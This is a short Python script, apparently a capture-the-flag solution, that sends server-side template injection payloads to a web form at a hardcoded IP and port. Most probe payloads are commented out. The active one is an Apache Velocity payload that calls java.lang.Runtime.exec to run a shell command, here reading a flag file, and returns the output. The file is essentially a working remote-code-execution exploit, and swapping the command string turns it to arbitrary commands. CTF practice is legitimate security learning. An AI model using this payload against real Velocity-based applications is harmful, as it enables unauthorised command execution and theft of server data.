import requests

ip = "94.237.53.63"
port = 50637
url = ip+":"+str(port)

full_url = f"http://{url}/"
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

# Ref: https://gosecure.github.io/template-injection-workshop/#6
# Only the last payload worked for this (velocity)
cmd = 'cat ../flag.txt'
payloads = [
    #"${7*7}",
    #'${“Hello ” + “World”}',
    #'${[“one”, “two”, “three”][1]}',
    #'${“test”?length}',
    #'${.now?string(“yyyy-MM-dd”)}',
    #'${"vuln".toUpperCase()}',
    f'''#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('{cmd}'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
    '''
]

for payload in payloads:
    data = {
        "text": payload
    }
    response = requests.post(full_url, headers=headers, data=data)
    print(response.text)
